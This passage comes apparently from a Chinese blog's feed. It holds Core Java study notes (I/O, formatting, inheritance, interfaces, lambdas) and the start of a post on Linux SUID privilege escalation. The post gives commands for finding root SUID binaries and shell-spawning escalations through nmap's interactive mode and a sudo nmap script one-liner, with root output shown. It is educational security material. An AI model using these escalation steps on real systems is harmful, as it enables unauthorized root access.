Horstmann</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">InputTest</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">      Scanner in = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line"></span><br><span class="line">      <span class="comment">// get first input</span></span><br><span class="line">      System.out.print(<span class="string">"What is your name? "</span>);</span><br><span class="line">      String name = in.nextLine();</span><br><span class="line"></span><br><span class="line">      <span class="comment">// get second input</span></span><br><span class="line">      System.out.print(<span class="string">"How old are you? "</span>);</span><br><span class="line">      <span class="keyword">int</span> age = in.nextInt();</span><br><span class="line"></span><br><span class="line">      <span class="comment">// display output on console</span></span><br><span class="line">      System.out.println(<span class="string">"Hello, "</span> + name + <span class="string">". Next year, you'll be "</span> + (age + <span class="number">1</span>));</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Java 6 引入 Console 类读取密码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Console cons = System.console();</span><br><span class="line">String username = cons.readLine(<span class="string">"Username: "</span>);</span><br><span class="line"><span class="keyword">char</span>[] passwd = cons.readPassword(<span class="string">"Password: "</span>);<span class="comment">//安全起见，返回密码存放在字符数组中。密码处理完成后，应马上用一个填充值覆盖字符数组元素</span></span><br></pre></td></tr></table></figure><h4 id="3-7-2-格式化输出"><a href="#3-7-2-格式化输出" class="headerlink" title="3.7.2 格式化输出"></a>3.7.2 格式化输出</h4><p>System.out.print 和 C 语言的语法差不多</p><p>格式化打印时间：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">System.out.printf(<span class="string">"%tc"</span>, <span class="keyword">new</span> Date());</span><br><span class="line"><span class="comment">//周六 8月 08 18:12:27 CST 2020</span></span><br><span class="line"></span><br><span class="line">Y年m月d日H时M分S秒</span><br></pre></td></tr></table></figure><p>一个参数可被多次使用，添加索引方式，索引必须以 <code>%</code> 开头，以 <code>$</code> 结束</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">System.out.printf(<span class="string">"%1$s %2$tB %2$tm, %2$tY"</span>, <span class="string">"Due date: "</span>, <span class="keyword">new</span> Date());</span><br><span class="line"><span class="comment">//Due date:  八月 08, 2020</span></span><br></pre></td></tr></table></figure><p>也可以使用 <code>&lt;</code> 知识前面的参数将被再次使用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">System.out.printf(<span class="string">"%s %tB %&lt;tm, %&lt;tY"</span>, <span class="string">"Due date: "</span>, <span class="keyword">new</span> Date());</span><br></pre></td></tr></table></figure><h4 id="3-7-3-文件输入输出"><a href="#3-7-3-文件输入输出" class="headerlink" title="3.7.3 文件输入输出"></a>3.7.3 文件输入输出</h4><h3 id="3-8-大数"><a href="#3-8-大数" class="headerlink" title="3.8 大数"></a>3.8 大数</h3><p>BigInteger 和 BigDecimal 可以分实现任意精度的整数和浮点数的计算</p><p>valueof 方法将普通的数值转化成大数：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BigInteger a = BigInteger.valueOf(<span class="number">100</span>);</span><br></pre></td></tr></table></figure><p>不能使用算法运算符(+和*)处理大数，而需要使用 add 和 multipy 方法</p><h2 id="4-对象与类"><a href="#4-对象与类" class="headerlink" title="4 对象与类"></a>4 对象与类</h2><h3 id="4-1-访问控制符"><a href="#4-1-访问控制符" class="headerlink" title="4.1 访问控制符"></a>4.1 访问控制符</h3><ul><li>private —— 仅对本类可见</li><li>public —— 对外部完全可见</li><li>protected —— 对本包和所有子类可见</li><li>默认，不需要修饰符 —— 对本包可见</li></ul><h3 id="4-2-包"><a href="#4-2-包" class="headerlink" title="4.2 包"></a>4.2 包</h3><p>用命令行编译运行带包的 java 文件层，需要在上一层且带上包名</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">javac inheritance\ManagerTest.java</span><br><span class="line">java inheritance.ManagerTest</span><br></pre></td></tr></table></figure><h2 id="5-继承"><a href="#5-继承" class="headerlink" title="5 继承"></a>5 继承</h2><h3 id="5-1-类，超类和子类"><a href="#5-1-类，超类和子类" class="headerlink" title="5.1 类，超类和子类"></a>5.1 类，超类和子类</h3><p>已存在的类被称为超类（superclass）、基类（base class）或父类（parent class）；新类被称为子类（subclass）、派生类（derived class）或孩子类（child class）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.horstmann.corejava;</span><br><span class="line"></span><br><span class="line"><span class="comment">// the classes in this file are part of this package</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.time.*;</span><br><span class="line"></span><br><span class="line"><span class="comment">// import statements come after the package statement</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@version</span> 1.11 2015-05-08</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Cay Horstmann</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Employee</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">   <span class="keyword">private</span> String name;</span><br><span class="line">   <span class="keyword">private</span> <span class="keyword">double</span> salary;</span><br><span class="line">   <span class="keyword">private</span> LocalDate hireDay;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="title">Employee</span><span class="params">(String name, <span class="keyword">double</span> salary, <span class="keyword">int</span> year, <span class="keyword">int</span> month, <span class="keyword">int</span> day)</span></span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">      <span class="keyword">this</span>.name = name;</span><br><span class="line">      <span class="keyword">this</span>.salary = salary;</span><br><span class="line">      hireDay = LocalDate.of(year, month, day);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span></span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> name;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">double</span> <span class="title">getSalary</span><span class="params">()</span></span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> salary;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">public</span> LocalDate <span class="title">getHireDay</span><span class="params">()</span></span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> hireDay;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">raiseSalary</span><span class="params">(<span class="keyword">double</span> byPercent)</span></span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">      <span class="keyword">double</span> raise = salary * byPercent / <span class="number">100</span>;</span><br><span class="line">      salary += raise;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Manager</span> <span class="keyword">extends</span> <span class="title">Employee</span></span>&#123;</span><br><span class="line">……</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>覆盖方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">double</span> <span class="title">getSalary</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">double</span> baseSalary = <span class="keyword">super</span>.getSalary();</span><br><span class="line">    <span class="comment">//不能直接用salary，因为它在Employee类中是private的</span></span><br><span class="line"><span class="keyword">return</span> baseSalary+bonus;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>子类构造器</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">Manager</span><span class="params">(String name, <span class="keyword">double</span> salary, <span class="keyword">int</span> year, <span class="keyword">int</span> month, <span class="keyword">int</span> day)</span></span>&#123;</span><br><span class="line"><span class="keyword">super</span>(name, salary, year. month, day);</span><br><span class="line">bonus = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="5-1-1-阻止继承：final-类和方法"><a href="#5-1-1-阻止继承：final-类和方法" class="headerlink" title="5.1.1 阻止继承：final 类和方法"></a>5.1.1 阻止继承：final 类和方法</h4><p>阻止派生 Executive 类的子类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">Executiv</span> <span class="keyword">extends</span> <span class="title">Manager</span></span>&#123;</span><br><span class="line">……</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同样设置方法为 final ，子类就不可以覆盖这个方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Employee</span></span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> String <span class="title">getName</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> name;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="5-1-2-抽象类"><a href="#5-1-2-抽象类" class="headerlink" title="5.1.2 抽象类"></a>5.1.2 抽象类</h4><p>抽象类声明抽象的方法，具体实现是在子类。抽象类方便方法调用。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> abstractClasses;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> String <span class="title">getDescription</span><span class="params">()</span></span>;</span><br><span class="line">   <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">(String name)</span></span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">      <span class="keyword">this</span>.name = name;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span></span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> name;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Student</span> <span class="keyword">extends</span> <span class="title">Person</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> String <span class="title">getDescription</span><span class="params">()</span></span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="string">"a student majoring in "</span> + major;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="5-2-Object：所有类的超类"><a href="#5-2-Object：所有类的超类" class="headerlink" title="5.2 Object：所有类的超类"></a>5.2 Object：所有类的超类</h3><p>可以用 Object 类型变量引用任何类型的对象。具体操作时需要进行强制类型转换</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Object obj = <span class="keyword">new</span> Employee(<span class="string">"Hacker"</span>, <span class="number">3500</span>);</span><br><span class="line">Employee e = (Employee)obj;</span><br></pre></td></tr></table></figure><p>只有基本类型不是对象，所有数组类型，包括基本类型的数组都拓展了 Object 类</p><h3 id="5-3-泛型数组列表"><a href="#5-3-泛型数组列表" class="headerlink" title="5.3 泛型数组列表"></a>5.3 泛型数组列表</h3><p>Java 中允许在运行中确定数组的大小，更简单的方法是使用  ArrayList 类，类似于数组，但在添加或删除元素的时候，能自动调整数组容量。</p><p>尖括号中类型参数不允许是基本类型</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ArrayList&lt;Employee&gt; staff = <span class="keyword">new</span> ArrayList&lt;Employee&gt;();</span><br><span class="line"><span class="comment">//or</span></span><br><span class="line">ArrayList&lt;Employee&gt; staff = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line"><span class="comment">//java10 可以使用 var</span></span><br><span class="line"><span class="keyword">var</span> staff = <span class="keyword">new</span> ArrayList&lt;Employee&gt;();</span><br><span class="line"></span><br><span class="line">staff.add(<span class="keyword">new</span> Employee(<span class="string">"Hacker"</span>,...));</span><br><span class="line">staff.set(i, harry);</span><br><span class="line">Employee e = staff.get(i);</span><br></pre></td></tr></table></figure><h3 id="5-4-反射"><a href="#5-4-反射" class="headerlink" title="5.4 反射"></a>5.4 反射</h3><p><a href="https://javasec.org/javase/Reflection/Reflection.html" target="_blank" rel="noopener">https://javasec.org/javase/Reflection/Reflection.html</a></p><h2 id="6-接口、lambda-表达式与内部类"><a href="#6-接口、lambda-表达式与内部类" class="headerlink" title="6 接口、lambda 表达式与内部类"></a>6 接口、lambda 表达式与内部类</h2><h3 id="6-1-接口"><a href="#6-1-接口" class="headerlink" title="6.1 接口"></a>6.1 接口</h3><p>接口不是类，而是对希望符合这个接口的类的一组需求。</p><p>Comparable 接口代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Comparable</span>&lt;<span class="title">T</span>&gt;</span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">compareTo</span><span class="params">(T other)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在接口中所有方法都自动是 public，不过在实现的时候，必须把方法声明为 public</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Employee</span> <span class="keyword">implements</span> <span class="title">Comparable</span>&lt;<span class="title">Employee</span>&gt;</span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">   <span class="comment">/**</span></span><br><span class="line"><span class="comment">    * Compares employees by salary</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@param</span> other another Employee object</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@return</span> a negative value if this employee has a lower salary than</span></span><br><span class="line"><span class="comment">    * otherObject, 0 if the salaries are the same, a positive value otherwise</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">compareTo</span><span class="params">(Employee other)</span></span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> Double.compare(salary, other.salary);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p><strong>为什么不把接口设计为抽象类呢？</strong></p><p>一个类智能继承一个类但能实现多个接口。</p><p>Java 设计者选择了不支持多重继承，因为其会让语言变得非常复杂或者降低效率。</p></blockquote><h3 id="6-2-lambda-表达式"><a href="#6-2-lambda-表达式" class="headerlink" title="6.2 lambda 表达式"></a>6.2 lambda 表达式</h3><p>Lambda 允许把函数作为一个方法的参数（函数作为参数传递进方法中）。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> lambda;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.swing.*;</span><br><span class="line"><span class="keyword">import</span> javax.swing.Timer;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * This program demonstrates the use of lambda expressions.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@version</span> 1.0 2015-05-12</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Cay Horstmann</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LambdaTest</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">      <span class="keyword">var</span> planets = <span class="keyword">new</span> String[] &#123; <span class="string">"Mercury"</span>, <span class="string">"Venus"</span>, <span class="string">"Earth"</span>, <span class="string">"Mars"</span>, </span><br><span class="line">         <span class="string">"Jupiter"</span>, <span class="string">"Saturn"</span>, <span class="string">"Uranus"</span>, <span class="string">"Neptune"</span> &#125;;</span><br><span class="line">      System.out.println(Arrays.toString(planets));</span><br><span class="line">      System.out.println(<span class="string">"Sorted in dictionary order:"</span>);</span><br><span class="line">      Arrays.sort(planets);</span><br><span class="line">      System.out.println(Arrays.toString(planets));</span><br><span class="line">      System.out.println(<span class="string">"Sorted by length:"</span>);</span><br><span class="line">      Arrays.sort(planets, (first, second) -&gt; first.length() - second.length());</span><br><span class="line">      System.out.println(Arrays.toString(planets));</span><br><span class="line">            </span><br><span class="line">      <span class="keyword">var</span> timer = <span class="keyword">new</span> Timer(<span class="number">1000</span>, event -&gt;</span><br><span class="line">         System.out.println(<span class="string">"The time is "</span> + <span class="keyword">new</span> Date()));</span><br><span class="line">      timer.start();   </span><br><span class="line">         </span><br><span class="line">      <span class="comment">// keep program running until user selects "OK"</span></span><br><span class="line">      JOptionPane.showMessageDialog(<span class="keyword">null</span>, <span class="string">"Quit program?"</span>);</span><br><span class="line">      System.exit(<span class="number">0</span>);         </span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="6-3-代理"><a href="#6-3-代理" class="headerlink" title="6.3 代理"></a>6.3 代理</h3><p>动态代理（Dynamic Proxy）的机制：可以在运行期动态创建给定接口的新类。</p><p><a href="https://javasec.org/javase/DynamicProxy/DynamicProxy.html" target="_blank" rel="noopener">https://javasec.org/javase/DynamicProxy/DynamicProxy.html</a></p><h2 id="7-异常处理"><a href="#7-异常处理" class="headerlink" title="7 异常处理"></a>7 异常处理</h2><p><a href="https://www.runoob.com/java/java-exceptions.html" target="_blank" rel="noopener">https://www.runoob.com/java/java-exceptions.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;1-Java-概述&quot;&gt;&lt;a href=&quot;#1-Java-概述&quot; class=&quot;headerlink&quot; title=&quot;1 Java 概述&quot;&gt;&lt;/a&gt;1 Java 概述&lt;/h2&gt;&lt;p&gt;2014 Java8&lt;/p&gt;
&lt;p&gt;2017 Java9&lt;/p&gt;
&lt;p&gt;Java11 LTS版&lt;/p&gt;
&lt;h2 id=&quot;2-Java-程序设计环境&quot;&gt;&lt;a href=&quot;#2-Java-程序设计环境&quot; class=&quot;headerlink&quot; title=&quot;2 Java 程序设计环境&quot;&gt;&lt;/a&gt;2 Java 程序设计环境&lt;/h2&gt;&lt;h3 id=&quot;2-1-Java-术语&quot;&gt;&lt;a href=&quot;#2-1-Java-术语&quot; class=&quot;headerlink&quot; title=&quot;2.1 Java 术语&quot;&gt;&lt;/a&gt;2.1 Java 术语&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;JDK: Java开发工具(包含JRE)&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;JRE: Java运行环境&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Java SE (Standard Edition) 标准版本：用于桌面或者简单服务器应用的Java平台&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Java EE (Enterprise Edition) 企业版本：用于复杂服务器应用的Java平台&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Java ME (Micro Edition) 微型版本：用于小型设备的Java平台&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;NetBeans：Oracle公司的集成开发环境&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
    
    
      <category term="Java" scheme="https://jlkl.github.io/tags/Java/"/>
    
      <category term="Web" scheme="https://jlkl.github.io/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>Linux SUID 提权</title>
    <link href="https://jlkl.github.io/2020/01/27/Web_15/"/>
    <id>https://jlkl.github.io/2020/01/27/Web_15/</id>
    <published>2020-01-27T08:59:01.000Z</published>
    <updated>2020-01-27T09:06:20.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>面试时发现关于 SUID 并不是很清楚，所以学习记录下</p><h2 id="0x01-关于-SUID"><a href="#0x01-关于-SUID" class="headerlink" title="0x01 关于 SUID"></a>0x01 关于 SUID</h2><p>SUID（设置用户ID）是赋予文件的一种权限，它会出现在文件拥有者权限的执行位上，具有这种权限的文件会在其执行时，使调用者暂时获得该文件拥有者的权限。</p><p>那么，为什么要给Linux二进制文件设置这种权限呢？其实原因有很多，例如，程序ping需要root权限才能打开网络套接字，但执行该程序的用户通常都是由普通用户，来验证与其他主机的连通性。</p><a id="more"></a><p>但是，如果某些现有的二进制文件和实用程序具有SUID权限的话，就可以在执行时将权限提升为root。</p><p>如 <code>passwd</code> 的权限：</p><p><img src="/2020/01/27/Web_15/20200127144036.png" alt></p><p>用户可以输入自己的密码或者不需要密码在root权限下执行命令，这可在设置文件 <code>/etc/sudoers</code> 中配置。</p><h3 id="1-1-etc-sudoers-语法"><a href="#1-1-etc-sudoers-语法" class="headerlink" title="1.1 /etc/sudoers 语法"></a>1.1 /etc/sudoers 语法</h3><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root <span class="keyword">ALL</span>=(<span class="keyword">ALL</span>) <span class="keyword">ALL</span></span><br></pre></td></tr></table></figure><p>root 用户可以从 ALL（任何）终端执行，充当ALL（任何）用户，并运行ALL（任何）命令。第一部分指定用户，第二部分指定可充当用户，第三部分指定 <code>sudo</code> 可运行的命令。</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">touhid <span class="keyword">ALL</span>= /sbin/poweroff</span><br></pre></td></tr></table></figure><p>输入 touchid 的密码，可以 sudo 执行 poweroff 命令。</p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">touhid ALL = (root) <span class="string">NOPASSWD:</span> <span class="regexp">/usr/</span>bin/find</span><br></pre></td></tr></table></figure><p>不输入密码,可以 sudo 执行 find 命令</p><h3 id="1-2-查找具有-SUID-权限位文件"><a href="#1-2-查找具有-SUID-权限位文件" class="headerlink" title="1.2 查找具有 SUID 权限位文件"></a>1.2 查找具有 SUID 权限位文件</h3><p>以下命令可以找到正在系统上运行的所有SUID可执行文件。准确的说，这个命令将从/目录中查找具有SUID权限位且属主为root的文件并输出它们，然后将所有错误重定向到/dev/null，从而仅列出该用户具有访问权限的那些二进制文件。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="builtin-name">find</span> / -user root -perm -4000 -<span class="builtin-name">print</span> 2&gt;/dev/<span class="literal">null</span></span><br><span class="line"><span class="builtin-name">find</span> / -perm <span class="attribute">-u</span>=s -type f 2&gt;/dev/<span class="literal">null</span></span><br><span class="line"><span class="builtin-name">find</span> / -user root -perm -4000 -exec ls -ldb &#123;&#125; ;</span><br></pre></td></tr></table></figure><p>也可以使用 <code>sudo -l</code> 命令列出当前用户可执行的命令</p><p><img src="/2020/01/27/Web_15/20200127151310.png" alt></p><h2 id="0x02-常用提权方式"><a href="#0x02-常用提权方式" class="headerlink" title="0x02 常用提权方式"></a>0x02 常用提权方式</h2><h3 id="2-1-nmap"><a href="#2-1-nmap" class="headerlink" title="2.1 nmap"></a>2.1 nmap</h3><p>nmap（2.02-5.21）存在交换模式，可利用提权</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap <span class="comment">--interactive</span></span><br></pre></td></tr></table></figure><p>之后执行:</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nmap&gt; !<span class="keyword">sh</span></span><br><span class="line"><span class="keyword">sh-3.2# </span>whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure><p>msf中的模块为：</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exploit/unix/<span class="keyword">local</span>/setuid_nmap</span><br></pre></td></tr></table></figure><p>较新版可使用 <code>--script</code> 参数：</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">"os.execute('/bin/sh')"</span> &gt; /tmp/<span class="keyword">shell</span>.nse &amp;&amp; sudo <span class="keyword">nmap</span> --script=/tmp/<span class="keyword">shell</span>.nse</span><br></pre></td></tr></table></figure><p>kali nmap 7.7 提权成功：</p><p><img src="/2020/01/27/Web_15/20200127154030.png" alt></p><h3 id="2-2-find"><a href="#2-2-find" class="headerlink" title="2.2 